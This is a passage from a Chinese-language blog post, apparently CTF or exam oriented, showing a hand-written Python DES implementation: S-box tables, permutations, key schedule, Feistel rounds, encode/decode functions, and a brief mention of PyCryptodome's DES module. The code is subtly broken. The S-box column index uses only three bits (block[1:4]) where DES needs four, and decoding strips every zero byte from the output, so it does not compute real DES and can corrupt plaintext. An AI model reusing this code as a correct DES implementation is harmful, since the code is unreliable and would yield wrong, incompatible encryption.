class="number">0x9</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xe</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xe</span>,</span><br><span class="line">                <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x3</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xb</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]  <span class="comment"># 16进制表示S盒的数据，S盒是为了将48位转换为32位，有8个盒子</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__substitution</span>(<span class="params">self, table: <span class="built_in">str</span>, self_table: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param table: 需要进行置换的列表,是一个01字符串</span></span><br><span class="line"><span class="string">        :param self_table: 置换表，在__init__中初始化了</span></span><br><span class="line"><span class="string">        :return: 返回置换后的01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        sub_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self_table:</span><br><span class="line">            sub_result += table[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> sub_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2bin</span>(<span class="params">self, string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将明文转为二进制字符串:</span></span><br><span class="line"><span class="string">        :param string: 任意字符串</span></span><br><span class="line"><span class="string">        :return:二进制字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        plaintext_list = <span class="built_in">list</span>(<span class="built_in">bytes</span>(string, <span class="string">&#x27;utf8&#x27;</span>))  <span class="comment"># 将字符串转成bytes类型，再转成list</span></span><br><span class="line">        result = []  <span class="comment"># 定义返回结果</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> plaintext_list:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))  <span class="comment"># 将列表的每个元素转成二进制字符串，8位宽度</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bin2str</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        二进制字符串转成字符串</span></span><br><span class="line"><span class="string">        :param binary:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))  <span class="comment"># 对二进制转成int</span></span><br><span class="line">        result = <span class="built_in">bytes</span>(list_int).decode()  <span class="comment"># 将列表转成bytes，在进行解码，得到字符串</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bin2int</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        由于加密之后的二进制无法直接转成字符，有不可见字符在，utf8可能无法解码，所以需要将二进制字符串每8位转成int型号列表，用于转成bytes再转hex</span></span><br><span class="line"><span class="string">        :param binary: 二进制字符串</span></span><br><span class="line"><span class="string">        :return: int型列表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> list_int</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__int2bin</span>(<span class="params">self, list_int: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> list_int:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_block_list</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        对明文二进制串进行切分，每64位为一块，DES加密以64位为一组进行加密的</span></span><br><span class="line"><span class="string">        :type binary: 二进制串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        len_binary = <span class="built_in">len</span>(binary)</span><br><span class="line">        <span class="keyword">if</span> len_binary % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">            binary_block = binary + (<span class="string">&quot;0&quot;</span> * (<span class="number">64</span> - (len_binary % <span class="number">64</span>)))</span><br><span class="line">            <span class="keyword">return</span> [binary_block[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_block), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> [binary[j:j + <span class="number">64</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">64</span>)]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_secretkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        修改默认密钥函数</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;当前二进制形式密钥为:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;当前字符串形式密钥为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.bin2str(self.K)))</span><br><span class="line">        newkey = <span class="built_in">input</span>(<span class="string">&quot;输入新的密钥（长度为8）：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(newkey) != <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;密钥长度不符合，请重新输入：&quot;</span>)</span><br><span class="line">            self.modify_secretkey()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_key = self.str2bin(newkey)</span><br><span class="line">            self.K = bin_key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前二进制形式密钥为:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.K))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__f_funtion</span>(<span class="params">self, right: <span class="built_in">str</span>, key: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param right: 明文二进制的字符串加密过程的右半段</span></span><br><span class="line"><span class="string">        :param key: 当前轮数的密钥</span></span><br><span class="line"><span class="string">        :return: 进行E扩展，与key异或操作，S盒操作后返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 对right进行E扩展</span></span><br><span class="line">        e_result = self.__substitution(right, self.E)</span><br><span class="line">        <span class="comment"># 与key 进行异或操作</span></span><br><span class="line">        xor_result = self.__xor_function(e_result, key)</span><br><span class="line">        <span class="comment"># 进入S盒子</span></span><br><span class="line">        s_result = self.__s_box(xor_result)</span><br><span class="line">        <span class="comment"># 进行P置换</span></span><br><span class="line">        p_result = self.__substitution(s_result, self.P)</span><br><span class="line">        <span class="keyword">return</span> p_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_key_list</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 返回加密过程中16轮的子密钥</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = self.__substitution(self.K, self.k1)</span><br><span class="line">        left_key = key[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        right_key = key[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">            move = self.k0[i - <span class="number">1</span>]</span><br><span class="line">            move_left = left_key[move:<span class="number">28</span>] + left_key[<span class="number">0</span>:move]</span><br><span class="line">            move_right = right_key[move:<span class="number">28</span>] + right_key[<span class="number">0</span>:move]</span><br><span class="line">            left_key = move_left</span><br><span class="line">            right_key = move_right</span><br><span class="line">            move_key = left_key + right_key</span><br><span class="line">            ki = self.__substitution(move_key, self.k2)</span><br><span class="line">            keys.append(ki)</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor_function</span>(<span class="params">self, xor1: <span class="built_in">str</span>, xor2: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor1: 01字符串</span></span><br><span class="line"><span class="string">        :param xor2: 01字符串</span></span><br><span class="line"><span class="string">        :return: 异或操作返回的结果</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        size = <span class="built_in">len</span>(xor1)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size):</span><br><span class="line">            result += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> xor1[i] == xor2[i] <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__s_box</span>(<span class="params">self, xor_result: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param xor_result: 48位01字符串</span></span><br><span class="line"><span class="string">        :return: 返回32位01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="comment"># 将48位数据分为6组，循环进行</span></span><br><span class="line">            block = xor_result[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>]</span><br><span class="line">            line = <span class="built_in">int</span>(block[<span class="number">0</span>] + block[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            colmn = <span class="built_in">int</span>(block[<span class="number">1</span>:<span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line">            res = <span class="built_in">bin</span>(self.S[i][line*<span class="number">16</span> + colmn])[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt; <span class="number">4</span>:</span><br><span class="line">                res = <span class="string">&#x27;0&#x27;</span> * (<span class="number">4</span> - <span class="built_in">len</span>(res)) + res</span><br><span class="line">            result += res</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iteration</span>(<span class="params">self, bin_plaintext: <span class="built_in">str</span>, key_list: <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param bin_plaintext: 01字符串，64位</span></span><br><span class="line"><span class="string">        :param key_list: 密钥列表，共16个</span></span><br><span class="line"><span class="string">        :return: 进行F函数以及和left异或操作之后的字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        left = bin_plaintext[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">        right = bin_plaintext[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">            next_lift = right</span><br><span class="line">            f_result = self.__f_funtion(right, key_list[i])</span><br><span class="line">            next_right = self.__xor_function(left, f_result)</span><br><span class="line">            left = next_lift</span><br><span class="line">            right = next_right</span><br><span class="line">        bin_plaintext_result = left + right</span><br><span class="line">        <span class="keyword">return</span> bin_plaintext_result[<span class="number">32</span>:] + bin_plaintext_result[:<span class="number">32</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param plaintext: 明文字符串</span></span><br><span class="line"><span class="string">        :return: 密文字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        bin_plaintext = self.str2bin(plaintext)</span><br><span class="line">        bin_plaintext_block = self.__get_block_list(bin_plaintext)</span><br><span class="line">        ciphertext_bin_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_plaintext_block:</span><br><span class="line">            <span class="comment"># 初代ip置换</span></span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite_result = self.__iteration(sub_ip, key_list)</span><br><span class="line">            <span class="comment"># 逆ip置换</span></span><br><span class="line">            sub_ip1 = self.__substitution(ite_result, self.ip1)</span><br><span class="line">            ciphertext_bin_list.append(sub_ip1)</span><br><span class="line">        ciphertext_bin = <span class="string">&#x27;&#x27;</span>.join(ciphertext_bin_list)</span><br><span class="line">        result = self.__bin2int(ciphertext_bin)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result).<span class="built_in">hex</span>().upper()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        :param ciphertext: 密文字符串</span></span><br><span class="line"><span class="string">        :return: 明文字符串</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        b_ciphertext = binascii.a2b_hex(ciphertext)</span><br><span class="line">        bin_ciphertext = self.__int2bin(<span class="built_in">list</span>(b_ciphertext))</span><br><span class="line">        bin_plaintext_list = []</span><br><span class="line">        key_list = self.__get_key_list()</span><br><span class="line">        key_list = key_list[::-<span class="number">1</span>]</span><br><span class="line">        bin_ciphertext_block = [bin_ciphertext[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_ciphertext), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> bin_ciphertext_block:</span><br><span class="line">            sub_ip = self.__substitution(block, self.ip)</span><br><span class="line">            ite = self.__iteration(sub_ip, key_list)</span><br><span class="line">            sub_ip1 = self.__substitution(ite, self.ip1)</span><br><span class="line">            bin_plaintext_list.append(sub_ip1)</span><br><span class="line">        bin_plaintext = <span class="string">&#x27;&#x27;</span>.join(bin_plaintext_list).replace(<span class="string">&#x27;00000000&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.bin2str(bin_plaintext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self</span>):</span><br><span class="line">        select = <span class="built_in">input</span>(<span class="string">&quot;Please selecting:\n1、Encryption\t 2、Decrpytion\nYour selecting:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> select == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input plaintext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your plaintext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            ciphertext = self.encode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The ciphertext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(ciphertext))</span><br><span class="line">        <span class="keyword">elif</span> select == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            plaintext = <span class="built_in">input</span>(<span class="string">&quot;Input ciphertext：&quot;</span>)</span><br><span class="line">            <span class="comment"># print(&quot;Your ciphertext is:&#123;&#125;&quot;.format(plaintext))</span></span><br><span class="line">            plaintext = self.decode(plaintext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The plaintext is:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(plaintext))</span><br><span class="line">            <span class="comment"># print(len(plaintext))</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Please selecting again！&quot;</span>)</span><br><span class="line">            self.main()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mydes = ArrangeSimpleDES()</span><br><span class="line">    mydes.modify_secretkey()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mydes.main()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>另外要说的是，python也有模块可以直接进行des的加解密，但是真要考DES多半不会直接用这个就能出。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line">message = b&#x27;&#x27;</span><br><span class="line">key = b&#x27;&#x27;</span><br><span class="line">cipher = DES.new(key, DES.MODE_ECB) #这里使用了ECB模式</span><br><span 